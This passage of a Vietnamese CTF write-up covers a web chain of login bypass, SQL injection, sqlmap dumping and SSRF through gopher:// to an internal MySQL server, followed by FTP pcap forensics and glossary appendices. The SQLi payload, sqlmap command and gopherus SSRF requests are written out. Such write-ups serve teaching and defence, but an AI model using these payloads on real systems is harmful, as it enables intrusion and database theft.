(đạt được nhờ integer overflow), và nó được **tính động** (nên `strings`/dò tĩnh chuỗi là vô ích).
Đây cũng là lý do đề dám công khai `.exe`: không thể "nhặt" flag mà không hiểu điều kiện.

> *Lưu ý phương pháp:* toàn bộ mục (l)(m) dùng `objdump -d`/`-s` (tĩnh). **Không** thực thi `.exe`.
> Nếu muốn lấy flag trọn vẹn mà không chạy, có thể nạp vào Ghidra, đổi điều kiện `jne 0x4017b0`
> hoặc *emulate* riêng hàm dựng chuỗi — nhưng flag đã biết chắc từ phân tích trên.

---

## 7. Chuỗi tấn công SSRF tới cơ sở dữ liệu

Bài khó nhất của giải: một **chuỗi tấn công nhiều tầng** (attack chain):
**bypass đăng nhập → SQL Injection → phát hiện dịch vụ nội bộ → SSRF → dùng gopher gửi gói MySQL
thô → đọc bảng flag**. Mục tiêu: `http://176.32.76.86:80`.

### (a) Đề bài & metadata
- **Tên:** Chuỗi SSRF tới CSDL
- **Category:** Web (SQLi + SSRF + protocol smuggling)
- **File đính kèm:** không có (bài online).
- **Mục tiêu:** lấy flag nằm trong CSDL MySQL ở "phía sau" (backend) — không truy cập trực tiếp được.

### (b) Kiến thức nền

**SQL Injection (SQLi).** Khi ứng dụng ghép dữ liệu người dùng vào câu lệnh SQL mà không lọc, kẻ
tấn công "tiêm" cú pháp SQL để đổi ý nghĩa truy vấn. Kinh điển: `' OR '1'='1` khiến điều kiện luôn
đúng. `--` bắt đầu *comment* trong SQL, vô hiệu hoá phần phía sau.

**SSRF (Server-Side Request Forgery).** Lỗi khiến **server** đi gửi request HTTP(S)/TCP tới địa chỉ
mà *ta* chỉ định. Nguy hiểm vì server thường nằm trong mạng nội bộ, tới được các dịch vụ mà người
ngoài không với tới (vd `mysql:3306`, `127.0.0.1`, metadata cloud `169.254.169.254`).

**Giao thức `gopher://` và vì sao nó "thần thánh" cho SSRF.** `gopher` là giao thức cổ; `curl` hỗ
trợ nó và **gửi dữ liệu thô gần như nguyên văn qua TCP**. Cú pháp: `gopher://host:port/_<payload>`.
Ký tự đầu sau `/` là *item-type* (bị bỏ đi — nên hay dùng `_`), phần còn lại gửi thẳng. Nhờ đó, nếu
SSRF dùng `curl`, ta dựng được **gói nhị phân của bất kỳ giao thức TCP nào** (HTTP, MySQL, Redis,
SMTP...) để "nói chuyện" với dịch vụ nội bộ. Ký tự đặc biệt được URL-encode (`%0A` = xuống dòng,
`%00` = NUL...).

**Giao thức MySQL & đăng nhập không mật khẩu.** MySQL dùng giao thức nhị phân riêng (không phải
HTTP). Khi kết nối, server gửi *handshake*, client trả *login packet* (username, cờ, response mật
khẩu). Nếu tài khoản **không có mật khẩu**, login packet rất đơn giản (response rỗng) → có thể dựng
sẵn bằng công cụ **gopherus**. Sau khi đăng nhập, client gửi gói *COM_QUERY* chứa câu SQL.

**gopherus** là tool sinh sẵn chuỗi `gopher://...` cho các dịch vụ phổ biến (MySQL, Redis,
PostgreSQL, FastCGI, SMTP...), lo giúp phần đóng gói nhị phân phức tạp.

### (c) Trinh sát ban đầu
```bash
curl -s http://176.32.76.86/           # xem trang chủ
curl -sI http://176.32.76.86/          # xem header: Server: nginx/1.21.4, X-Powered-By: PHP/5.6.40
```
Trang `/` là form đăng nhập, username điền sẵn `user1`; trong HTML có **comment gợi ý mật khẩu
`1234`**. Header lộ **nginx/1.21.4** + **PHP/5.6.40**.

### (d) Phân tích từng bước (reasoning, có nêu hướng sai)

**Bước 1 — Bypass kiểm tra độ dài mật khẩu.**
Gửi `password=1234` → server báo *mật khẩu phải ≥ 6 ký tự*. Nhưng mật khẩu thật là `1234` (4 ký
tự). Mẹo: trong *form-urlencoding*, dấu `+` được giải mã thành **dấu cách**. Gửi:
```
password=1234++
```
server nhận `"1234  "` (6 ký tự → qua kiểm tra độ dài). Có vẻ server lại **trim** (cắt khoảng
trắng hai đầu) *trước khi so sánh mật khẩu*, nên `"1234  "` trim thành `"1234"` → khớp. Kết quả:
**302** sang `success.php` + cookie phiên mới.
> *Hướng sai đã loại:* thử brute mật khẩu 6+ ký tự (vô vọng). Mấu chốt là mâu thuẫn giữa "check độ
> dài trên chuỗi gốc" nhưng "so khớp trên chuỗi đã trim".

**Bước 2 — Lần theo trang sau đăng nhập.**
`success.php` là trang "System Monitoring", có link `apidoc.php`. JavaScript inline gọi:
```
GET  http://176.32.76.86:5000/list?type=www
POST http://176.32.76.86:5000/host/curl     (gửi host lấy được ở trên)
```
Xuất hiện **một dịch vụ API ở cổng 5000** với 2 endpoint đáng chú ý: `/list` và `/host/curl`.

**Bước 3 — Đọc tài liệu `apidoc.php`.**
`GET /list?type=<...>` trả về một dòng gồm: `ID, host, port, dbuser, dbname, dbtype, credential`.
`type` là tham số do ta kiểm soát → nghi ngờ **SQLi**.

**Bước 4 — SQL Injection ở `type`.**
Payload (URL-encoded) tác giả dùng:
```
/list?type='OR'1'%3d'1'+AND+ID%3d2%3b--
```
Giải mã (`%3d`=`=`, `+`=space, `%3b`=`;`):
```sql
type=' OR '1'='1' AND ID=2;--
```
- `'` đóng chuỗi `type` trong câu SQL gốc.
- `OR '1'='1'` làm điều kiện luôn đúng.
- `AND ID=2` lọc đúng dòng ID=2.
- `;--` kết thúc câu lệnh + comment phần còn lại.
Server trả về đúng dòng ID=2 ⇒ xác nhận injectable.

**Bước 5 — Dump toàn bộ bảng bằng sqlmap.**
Backend là **SQLite**; bảng `items`:
```bash
sqlmap -u "http://176.32.76.86:5000/list?type=www" --batch --dump -T items
```
Kết quả (quan trọng):

| id | port | host | user | pass | dbname | hosttype | tablename |
|----|------|------|------|------|--------|----------|-----------|
| 1 | 80   | 176.32.76.86 | | | | www | |
| 2 | 3306 | **mysql** | lara | secretsecret | ctf | mysql | ctf |
| 3 | 3306 | **mysql** | **root** | *(trống)* | ctf | mysql | **flag** |

Rút ra:
- Có **host nội bộ tên `mysql`** chạy MySQL cổng **3306** (chỉ server với tới được → cần SSRF).
- CSDL `ctf` có bảng **`flag`**.
- Tài khoản **`root` KHÔNG có mật khẩu** → đăng nhập không cần credential.

**Bước 6 — Xác nhận SSRF ở `/host/curl`.**
Endpoint nhận JSON `{"host": "..."}` rồi **dùng `curl` tải địa chỉ đó** và trả nội dung. Thử:
```bash
curl -s -X POST http://176.32.76.86:5000/host/curl \
     -H 'Content-Type: application/json' \
     -d '{"host":"http://176.32.76.86:80/"}'
```
→ nhận lại trang login ⇒ server thật sự đi fetch hộ ⇒ **đúng là SSRF**, và nó dùng `curl`.

**Bước 7 — Kiểm tra `curl` hỗ trợ `gopher://`.** Thử smuggle một HTTP request thô:
```json
{"host": "gopher://176.32.76.86:80/_GET / HTTP/1.0%0A%0A"}
```
→ phản hồi là HTTP reply của nginx. `_` sau port là item-type (bị bỏ) → còn `GET`; `%0A%0A` là 2
dòng trống kết thúc request. ⇒ **ta gửi được byte thô qua TCP** từ phía server.

### (e) Exploit đầy đủ — dựng gói MySQL bằng gopherus

```bash
python2 gopherus.py --exploit mysql
# Nhập:
#   username: root
#   query:    select * from ctf.flag;
# Tool in ra một URL dạng:
#   gopher://127.0.0.1:3306/_<chuỗi %XX dài: login packet + COM_QUERY>
```
`gopherus` đóng gói: (1) *login packet* của MySQL cho user `root` **không mật khẩu**, (2) tiếp theo
là gói *COM_QUERY* mang `select * from ctf.flag;`. Ta chỉ cần đổi host trong URL từ `127.0.0.1`
sang **`mysql:3306`** (tên host nội bộ phát hiện ở bước 5).

**Request cuối — gửi qua SSRF:**
```bash
curl -s -X POST http://176.32.76.86:5000/host/curl \
     -H 'Content-Type: application/json' \
     -d '{"host":"gopher://mysql:3306/_<payload_tu_gopherus>"}'
```
Server (qua SSRF) mở TCP tới `mysql:3306`, "phát lại" các byte gopher = login + query. MySQL trả về
**gói kết quả thô**; trong phần dữ liệu dòng (row data) có chứa flag.

**Output mẫu (rút gọn, dạng byte có lẫn text):**
```
...\x05ctf\x04flag... e9ces9p4z9jrai9c3zrs ...
                      ^^^^^^^^^^^^^^^^^^^^  (nội dung cột flag)
```
Ghép lại: `flag{e9ces9p4z9jrai9c3zrs}`.

### (f) Flag & ý nghĩa
```
flag{e9ces9p4z9jrai9c3zrs}
```
Bài học: SSRF + `gopher://` biến một "web request hộ" thành **kênh TCP tuỳ ý** tới dịch vụ nội bộ;
cộng với tài khoản DB **không mật khẩu** → đọc được dữ liệu nhạy cảm. Phòng chống: cấm scheme lạ
trong `curl` (`--proto`), chặn truy cập mạng nội bộ, đặt mật khẩu mạnh cho DB, dùng allowlist host.

### (g) Cạm bẫy & cách khác
- Quên đổi `127.0.0.1` → `mysql` trong URL gopher ⇒ server tự gọi chính nó, không tới được DB.
- `curl` phải được build có hỗ trợ `gopher` (đa số có). Nếu không, thử `dict://`, `ldap://`.
- Có thể thay gopherus bằng tự tay dựng packet MySQL, nhưng rất dễ sai độ dài; gopherus an toàn hơn.
- Nếu `root` có mật khẩu, bước login packet phức tạp hơn (phải tính `mysql_native_password` từ salt
  trong handshake) — nhưng đề cố tình để trống mật khẩu.

### (h) Tham khảo
- Tool: `gopherus`, `sqlmap`.
- OWASP: Server-Side Request Forgery; MySQL Client/Server Protocol (dev docs).

### (i) Đào sâu: cấu trúc URL gopher & gói MySQL
**Giải phẫu một URL gopher cho MySQL:**
```
gopher://mysql:3306/_<%XX %XX ...>
          └host┘ └p┘ │ └─ các byte đã URL-encode = login packet + query packet ─┘
                     └ item-type (1 ký tự, bị server gopher bỏ qua) -> dùng '_'
```
Khi server (qua SSRF `curl`) mở `gopher://mysql:3306`, nó kết nối TCP tới `mysql:3306` rồi **ghi thẳng
các byte sau `_`** vào socket — đúng như một MySQL client thật gửi.

**Khung gói MySQL (vì sao cần gopherus).** Mỗi gói MySQL có header 4 byte:
```
[3 byte length (little-endian)] [1 byte sequence id] [payload]
```
- *Login/handshake response packet* (sequence id = 1): gồm *capability flags*, max packet size,
  charset, username (`root\0`), và *auth response length = 0* (vì không mật khẩu), rồi tên database.
- *COM_QUERY packet* (sequence id = 0): 1 byte lệnh `0x03` + chuỗi SQL `select * from ctf.flag;`.

Tự tay đếm `length` cho đúng rất dễ sai (lệch 1 byte là hỏng handshake). `gopherus --exploit mysql`
lo trọn phần này, ta chỉ cung cấp username + query.

**Vì sao `root` không mật khẩu lại then chốt:** nếu có mật khẩu, client phải đọc *auth salt* (20
byte ngẫu nhiên) từ handshake của server rồi tính
`SHA1(password) XOR SHA1(salt + SHA1(SHA1(password)))` — không thể dựng *trước* vì salt đổi mỗi
phiên. Mật khẩu rỗng ⇒ auth response rỗng ⇒ gói login tĩnh, dựng sẵn được ⇒ gopher phát lại OK.

### (j) Sơ đồ toàn bộ attack chain
```
[Ta] --HTTP--> index.php     (bypass độ dài: password=1234++)
                 │ 302
                 v
             success.php  --> apidoc.php  (lộ API cổng 5000)
                 │
                 v
   GET :5000/list?type=' OR '1'='1 AND ID=2;--   (SQLi -> lộ bảng items)
                 │  (sqlmap dump: host=mysql, root, no-pass, db=ctf, table=flag)
                 v
   POST :5000/host/curl  {"host":"gopher://mysql:3306/_<login+query>"}   (SSRF+gopher)
                 │
                 v
         [mysql:3306]  --> trả row data chứa flag
```

### (k) Góc phòng thủ (chi tiết)
- **Chống SSRF:** allowlist host/scheme; `curl --proto '=http,https'` để cấm `gopher/dict/file`;
  chạy fetcher trong network namespace không thấy mạng nội bộ; chặn dải riêng (RFC1918, loopback,
  link-local).
- **DB:** không để tài khoản không mật khẩu; `root` chỉ bind `localhost`; tách quyền theo bảng.
- **SQLi:** dùng *prepared statement*/tham số hoá; không ghép chuỗi.
- **Login:** kiểm tra độ dài *sau* khi trim, nhất quán với lúc so khớp.

---

## 8. Khôi phục file truyền qua FTP

### (a) Đề bài & metadata
- **Tên:** Khôi phục file từ FTP
- **Category:** Forensics — khôi phục file truyền qua **FTP** trong bản bắt gói
- **File đính kèm:** `D8-ftp-capture/capture_8688e1a1263c414450b12985e0d5620b.pcapng`
  (**12 040 byte**, MD5 `8688e1a1263c414450b12985e0d5620b`).
- **Mục tiêu:** trích flag từ dữ liệu được truyền trong phiên FTP.
- (Người giải trong đội gốc: Enigmatrix.)

### (b) Kiến thức nền

**FTP (File Transfer Protocol)** là giao thức truyền file **không mã hoá**. Mọi thứ — username,
password, lệnh, lẫn nội dung file — đều đi dạng **chữ rõ (cleartext)**. Ai bắt được gói là đọc được
tất cả. Đây chính là thông điệp của bài (và của flag).

**Hai kênh của FTP: control & data.** FTP tách:
- *Kênh control* (thường cổng 21): mang các **lệnh** như `USER`, `PASS`, `LIST`, `RETR` (tải file),
  `STOR` (gửi file), `TYPE` (chế độ ASCII/binary).
- *Kênh data*: mang **nội dung file / kết quả LIST**. Kênh này mở riêng cho mỗi lần truyền.

**Active mode & lệnh `PORT`.** Ở *active mode*, client bảo server "hãy kết nối data về địa chỉ này"
bằng lệnh:
```
PORT h1,h2,h3,h4,p1,p2
```
- `h1.h2.h3.h4` = địa chỉ IP client.
- **cổng data = p1 × 256 + p2.**
Biết điều này giúp ta lần ra đúng luồng TCP chứa file trong Wireshark.

**Carving file bằng binwalk.** `binwalk` quét một khối dữ liệu để tìm **chữ ký (signature)** của
các định dạng nhúng (zip bắt đầu bằng `PK\x03\x04`, GIF bằng `GIF8`...) rồi tách (`-e`) chúng ra.
Chạy binwalk thẳng trên pcap sẽ "nhặt" được file được truyền mà không cần export tay từng luồng.

### (c) Trinh sát ban đầu
```bash
# Mở trong Wireshark -> Statistics -> Protocol Hierarchy: gần như toàn bộ là FTP + FTP-DATA
# Đọc nhanh nội dung text bằng strings:
strings capture_8688e1a1263c414450b12985e0d5620b.pcapng | grep -iE 'USER|PASS|RETR|PORT|LIST|passmemo|FLAG'
```

### (d) Phân tích từng bước (đã kiểm chứng từ pcap thật)
*Follow TCP Stream* kênh control cho thấy nguyên văn:
```
220 Microsoft FTP Service
USER ftpuser
PASS Pass#ftp18                 <- mật khẩu lộ cleartext
230 User logged in.
PORT 192,168,11,242,78,73       -> cổng data = 78*256+73 = 20041
200 PORT command successful.
LIST
  12-18-18  03:09PM      4709 FLAG.zip
  12-17-18  05:53PM        49 passmemo.txt
TYPE I                          <- chuyển sang binary
PORT 192,168,11,242,78,74       -> cổng data = 20042
RETR FLAG.zip                   <- tải FLAG.zip (4709 byte)
PORT 192,168,11,242,78,77       -> cổng data = 20045
RETR passmemo.txt               <- tải passmemo.txt (49 byte)
```
Và nội dung `passmemo.txt` (lấy từ luồng data) là một bảng nhỏ:
```
FLAG.zip   Do_you_use_FTP?
```
⇒ **mật khẩu của FLAG.zip là `Do_you_use_FTP?`**.

Các cổng data (20041/20042/20045) chỉ ra chính xác các luồng TCP mang nội dung `LIST`, `FLAG.zip`,
`passmemo.txt`. Trong `strings` cũng thấy mảnh `PK` (chữ ký zip) và tên `FLAG.GIF` (file bên trong
zip).

> *Hướng sai đã loại:* cố đọc flag trực tiếp trong pcap — không được vì flag nằm trong **ảnh GIF**
> bên trong **zip có mật khẩu**.

### (e) Lời giải chi tiết
**Cách nhanh — binwalk carve thẳng từ pcap:**
```bash
binwalk -e capture_8688e1a1263c414450b12985e0d5620b.pcapng
# Tạo thư mục _Way_..._.extracted/ chứa file zip (vd 10BE.zip) + mảnh FLAG.GIF
```
Giải nén zip bằng mật khẩu đã biết:
```bash
cd _capture_8688e1a1263c414450b12985e0d5620b.pcapng.extracted/
unzip 10BE.zip
# Archive:  10BE.zip
# [10BE.zip] FLAG.GIF password:  -> nhập: Do_you_use_FTP?
#   inflating: FLAG.GIF
```
Mở `FLAG.GIF` → ảnh hiển thị flag.

**Cách thủ công (không binwalk):** trong Wireshark, *File → Export Objects → FTP-DATA* (hoặc
*Follow TCP Stream* đúng cổng 20042) → *Save as* ra `FLAG.zip`; làm tương tự lấy `passmemo.txt`; rồi
`unzip FLAG.zip` với mật khẩu `Do_you_use_FTP?`.

### (f) Flag & ý nghĩa
```
flag{It's_dangerous_to_use_FTP}
```
Thông điệp quá rõ: FTP truyền *mọi thứ* dạng rõ (ta vừa đọc được cả mật khẩu `Pass#ftp18` lẫn mật
khẩu zip `Do_you_use_FTP?`), nên **dùng FTP là nguy hiểm** — hãy dùng FTPS/SFTP.

### (g) Cạm bẫy & cách khác
- Tên file zip sau khi binwalk tách có thể là offset (vd `10BE.zip`) chứ không phải `FLAG.zip` —
  đừng bối rối, nó vẫn là file đó.
- Nếu không có `passmemo.txt`, phải brute mật khẩu zip (`fcrackzip`/`john`); ở đây đề cho sẵn nên
  không cần.
- Có thể dùng `tshark`/`NetworkMiner` để tự động bóc file từ pcap.

### (h) Tham khảo
- RFC 959 (FTP), lệnh `PORT`/`RETR`.
- Công cụ: Wireshark (Export Objects / Follow Stream), `binwalk`, `NetworkMiner`.

### (i) Đào sâu: giải mã từng lệnh PORT & cách tìm luồng data
Công thức **cổng = p1×256 + p2** áp vào từng lệnh trong pcap:
| Lệnh PORT | p1,p2 | Tính | Cổng data | Dùng cho |
|-----------|-------|------|-----------|----------|
| `PORT 192,168,11,242,78,73` | 78,73 | 78×256+73 | **20041** | `LIST` (danh sách file) |
| `PORT 192,168,11,242,78,74` | 78,74 | 78×256+74 | **20042** | `RETR FLAG.zip` |
| `PORT 192,168,11,242,78,77` | 78,77 | 78×256+77 | **20045** | `RETR passmemo.txt` |

Trong Wireshark, để bóc chính xác nội dung `FLAG.zip`, đặt filter:
```
tcp.port == 20042
```
rồi *Follow TCP Stream* → *Show data as Raw* → *Save as* `FLAG.zip`. (Mỗi lần truyền active mode mở
một cổng data mới, nên mỗi file nằm ở một luồng riêng — biết cổng là biết luồng.)

### (j) Active mode vs Passive mode (vì sao bài này là active)
- **Active:** client gửi `PORT` bảo server *chủ động* kết nối ngược về client để mở kênh data. Trong
  pcap ta thấy lệnh `PORT ...` → đây là active mode.
- **Passive:** client gửi `PASV`, server trả về cổng để client *chủ động* kết nối tới. (Phổ biến hơn
  ngày nay vì vượt NAT/firewall tốt hơn.)
Nhận ra active/passive giúp biết bên nào mở cổng data và lần đúng luồng.

### (k) Góc phòng thủ & vì sao thông điệp flag đúng
Ta vừa đọc được *tất cả* trong bản rõ: tài khoản `ftpuser`, mật khẩu `Pass#ftp18`, mật khẩu zip
`Do_you_use_FTP?`, và nội dung file. Đó chính là lý do "It's dangerous to use FTP". Khuyến nghị:
dùng **SFTP** (trên SSH) hoặc **FTPS** (FTP over TLS) để mã hoá cả control lẫn data. Ngoài ra, khoá
zip truyền *cùng* kênh với file là sai lầm kép (lộ cả khoá lẫn dữ liệu).

---

## 9. Phụ lục: tổng kết kỹ thuật

### 9.1. Bảng kỹ thuật & bài học
| Challenge | Kỹ thuật cốt lõi | Khái niệm người mới cần nắm | Bài học phòng thủ |
|-----------|------------------|------------------------------|-------------------|
| D1 | Đọc Java serialized qua magic `ac ed` | Serialization, big-endian, tag byte | Cẩn trọng *insecure deserialization* |
| D2 | CVE-2021-41773 path traversal | HTTP header `Server`, `%2e`, GECOS | Vá kịp thời, ẩn banner |
| D3 | CVE-2017-5638 Struts2 OGNL RCE | OGNL, Content-Type injection | Nâng cấp Struts2, WAF |
| D4 | Phân giải DNS/CNAME | CDN, CNAME, đuôi domain nhận diện CDN | — (OSINT) |
| D5 | Giải mã TLS bằng RSA private key | RSA vs ECDHE, forward secrecy, `kRSA` | Dùng ECDHE, bảo vệ private key |
| D6 | Integer overflow (int32 bù hai) | Dải int, wrap-around, `%` của số âm | Kiểm tra tràn, dùng kiểu không dấu đúng cách |
| D7 | Login bypass → SQLi → SSRF → gopher→MySQL | SQLi, SSRF, gopher, giao thức MySQL | Lọc input, chặn scheme/host, mật khẩu DB |
| D8 | Carve file FTP từ pcap + zip password | FTP cleartext, active mode `PORT`, binwalk | Dùng SFTP/FTPS |

### 9.2. Bộ công cụ xuất hiện trong giải
- **Nhận dạng/forensics tĩnh:** `file`, `xxd`, `strings`, `md5sum`/`sha1sum`, `binwalk`.
- **Mạng:** Wireshark/`tshark`, `nmap` (+ NSE), `dig`/`nslookup`/`ping`.
- **Mật mã/chứng chỉ:** `openssl`, cấu hình `mod_ssl` (`SSLCipherSuite`).
- **Web/exploit:** `curl`, `sqlmap`, `struts-pwn`, `gopherus`, PoC CVE-2021-41773.
- **Reverse:** đọc mã nguồn C++, Python `struct`/`ctypes` để mô phỏng số học.

### 9.3. Ghi chú về ROT13 (Known Vuln 1 & 2)
Hai flag web bị mã hoá ROT13. Giải nhanh trên shell:
```bash
echo 'flag{N_oht_jnf_perngrq}'     | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # flag{A_bug_was_created}
echo 'flag{Fbzrqnl_vg_jvyy_or_hahfrq}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # flag{Someday_it_will_be_unused}
```
Nhắc lại: **flag hợp lệ để nộp là bản ROT13 nguyên trạng**, bản giải chỉ để hiểu ý nghĩa.

### 9.4. Kiểm chứng tính toàn vẹn (nhắc lại hash)
Toàn bộ file đề đã được tính hash và xác nhận filename = MD5 nội dung (xem mục 0.4). Nếu tải lại và
hash khác đi, nghĩa là file đã bị thay đổi/hỏng.

---

## 10. Phụ lục B: Giải thích thuật ngữ (cho người mới)

> Tra nhanh các từ khoá xuất hiện trong tài liệu. Xếp theo nhóm.

### 10.1. Khái niệm CTF chung
- **CTF (Capture The Flag):** cuộc thi an ninh mạng; giải từng thử thách để tìm chuỗi bí mật *flag*.
- **Flag:** chuỗi bí mật cần tìm, ở giải này dạng `flag{...}`. Nộp flag đúng được điểm.
- **Category:** phân loại bài — Web, Reverse (RE), Pwn (khai thác lỗ hổng nhị phân), Crypto,
  Forensics (điều tra số), OSINT (thu thập thông tin công khai), Misc.
- **Payload:** dữ liệu "độc" ta gửi để kích hoạt lỗ hổng.
- **PoC (Proof of Concept):** mã/exploit mẫu chứng minh một lỗ hổng khai thác được.

### 10.2. Mã hoá & biểu diễn dữ liệu
- **Hex (thập lục phân):** hệ cơ số 16 (0–9, a–f); mỗi byte = 2 chữ hex. `xxd`/`hexdump` để xem.
- **Big-endian / Little-endian:** thứ tự byte của số nhiều byte. Big-endian ghi byte *cao* trước
  (Java, giao thức mạng); little-endian ghi byte *thấp* trước (x86).
- **ASCII:** bảng mã ký tự, ví dụ `'0'`=0x30, `'A'`=0x41.
- **URL-encoding (percent-encoding):** biểu diễn ký tự đặc biệt bằng `%XX`, ví dụ `%2e`=`.`,
  `%0A`=xuống dòng, `+`=dấu cách (trong form).
- **ROT13:** phép xoay 13 chữ cái (Caesar cipher đặc biệt); áp 2 lần thì về gốc.
- **Magic bytes:** vài byte đầu nhận dạng định dạng file (`ac ed`=Java ser, `PK`=zip, `MZ`=PE,
  `GIF8`=gif, `\x89PNG`=png).
- **Hash (MD5/SHA1):** "dấu vân tay" cố định của dữ liệu; đổi 1 bit → hash khác hẳn. Dùng để kiểm
  tra toàn vẹn (không phải để mã hoá có thể đảo ngược).

### 10.3. Mạng & web
- **HTTP header:** các dòng metadata kèm request/response; `Server:` lộ phần mềm, `Location:` dùng
  cho redirect, `Content-Type:` báo kiểu dữ liệu.
- **Status code:** `200 OK`, `302 Found` (chuyển hướng), `404 Not Found`...
- **DNS / CNAME:** dịch tên miền → IP; CNAME là bí danh tên → tên.
- **TLS/HTTPS:** HTTP có mã hoá; *handshake* để thống nhất khoá; *session key* là khoá đối xứng mã
  hoá dữ liệu; *forward secrecy* = lộ khoá dài hạn vẫn không giải mã được phiên cũ.
- **CDN:** mạng máy chủ biên tăng tốc/chống tải cho website.
- **Cookie / session:** chuỗi server cấp để nhớ trạng thái đăng nhập của client.

### 10.4. Lỗ hổng & kỹ thuật tấn công
- **LFI (Local File Inclusion) / Path Traversal:** đọc file ngoài ý muốn bằng `../`.
- **RCE (Remote Code Execution):** chạy lệnh tuỳ ý trên server — mức nguy hiểm cao nhất.
- **SQL Injection (SQLi):** chèn cú pháp SQL để đổi ý nghĩa truy vấn.
- **SSRF (Server-Side Request Forgery):** ép server gửi request thay ta, chạm tới mạng nội bộ.
- **Deserialization:** dựng object từ byte; *insecure deserialization* là lớp lỗ hổng khi dữ liệu
  không tin cậy được deserialize.
- **Integer overflow:** số vượt dải biểu diễn → cuộn vòng, thường đổi dấu.
- **OGNL injection:** chèn biểu thức OGNL (Struts2) để chạy code Java.

### 10.5. Công cụ nhắc đến
- **Wireshark / tshark:** đọc & phân tích pcap; *Follow Stream*, *Export Objects*, *Protocol
  Hierarchy*.
- **binwalk:** tìm & tách file nhúng trong một khối dữ liệu.
- **nmap (+NSE):** quét cổng/dịch vụ; NSE là bộ script dò lỗ hổng.
- **openssl:** thao tác chứng chỉ/khoá/mã hoá.
- **sqlmap:** tự động phát hiện & khai thác SQLi.
- **gopherus:** sinh payload `gopher://` cho SSRF→(MySQL/Redis/...).
- **curl:** gửi HTTP và nhiều giao thức (gopher, dict...).
- **Ghidra / IDA / x64dbg:** dịch ngược & debug binary.

---

## 11. Phụ lục C: Phương pháp tiếp cận CTF (cho người mới)

Một quy trình chung áp dụng được cho hầu hết bài trong giải này:

1. **Nhận dạng (Identify).** Với file: `file`, `xxd`, `strings`, tính hash. Với dịch vụ online:
   `curl -I`, `nmap`. Mục tiêu: biết mình đang đối mặt *định dạng/phần mềm/phiên bản* gì.
2. **Nghiên cứu (Research).** Biết phiên bản → tra CVE. Biết định dạng → tra đặc tả. Tên bài thường
   là gợi ý ("Known Vulnerability", "Object", "Mod", "Way").
3. **Giả thuyết & kiểm chứng (Hypothesize & Test).** Đặt giả thuyết nhỏ, thử nhanh, loại dần. Ghi
   lại hướng sai để khỏi lặp.
4. **Khai thác (Exploit).** Dựng payload/script; chạy; đọc output.
5. **Trích flag (Extract).** Flag có thể bị mã hoá (ROT13), giấu trong trường lạ (GECOS), trong ảnh,
   hay trong gói nhị phân — luôn soi kỹ output.
6. **Ghi chép (Document).** Lưu lại lệnh + lý do để tái lập và học.

**Lưu ý an toàn khi làm RE/Forensics:** ưu tiên **phân tích tĩnh** (đọc byte, mã nguồn, hash). Chỉ
chạy binary trong môi trường cách ly (máy ảo/sandbox) khi thật cần; tài liệu này hoàn toàn không
chạy file `.exe` nào.

